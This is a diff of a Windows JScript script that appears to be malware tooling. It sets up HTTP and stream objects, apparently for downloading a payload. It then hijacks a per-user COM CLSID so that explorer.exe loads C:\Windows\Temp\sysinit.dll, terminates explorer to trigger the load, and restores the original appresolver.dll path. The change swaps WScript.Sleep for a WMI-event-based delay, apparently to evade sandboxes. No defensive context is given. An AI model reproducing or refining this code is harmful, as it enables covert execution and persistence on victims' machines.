@@ -1,3 +1,12 @@
+var CIMv2 = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\CIMv2")
+
+function sleep(count) {
+    var event_gen = CIMv2.ExecNotificationQuery("SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA \"Win32_LocalTime\"")
+    for(var i = 0; i < count; i++) {
+        event_gen.NextEvent();
+    }
+}
+
 var http_obj = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
 var stream_obj = new ActiveXObject("ADODB.Stream");
 var o = new ActiveXObject("WScript.Shell")
@@ -16,5 +25,5 @@ var explorerProc = objItem.item();
 o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","")
 o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","C:\\Windows\\Temp\\sysinit.dll" ,"REG_SZ")
 explorerProc.Terminate()
-WScript.Sleep(3000)
+sleep(3)
 o.RegWrite("HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{660b90c8-73a9-4b58-8cae-355b7f55341b}\\InprocServer32\\","C:\\Windows\\System32\\appresolver.dll" ,"REG_SZ")
